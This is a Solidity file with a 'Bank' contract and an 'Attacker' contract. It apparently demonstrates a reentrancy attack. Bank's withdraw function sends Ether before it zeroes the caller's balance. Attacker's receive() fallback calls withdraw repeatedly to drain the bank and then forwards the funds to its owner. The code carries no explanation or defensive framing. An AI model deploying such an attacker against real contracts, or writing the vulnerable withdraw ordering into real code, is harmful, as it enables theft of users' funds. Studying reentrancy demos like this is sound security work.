// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Bank {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }

    function withdraw() external {
        uint256 amt = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amt}(""); // must check return value of a low-level call
        if (!success) revert();
        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

contract Attacker {
    Bank public immutable mybank;
    address public owner;

    constructor(address payable _bankaddress) {
        mybank = Bank(_bankaddress);
        owner = msg.sender;
    }

    function attack() external payable {
        mybank.deposit{value: msg.value}();
        mybank.withdraw();
    }

    receive() external payable {
        if (address(mybank).balance >= mybank.getBalance()) {
            mybank.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
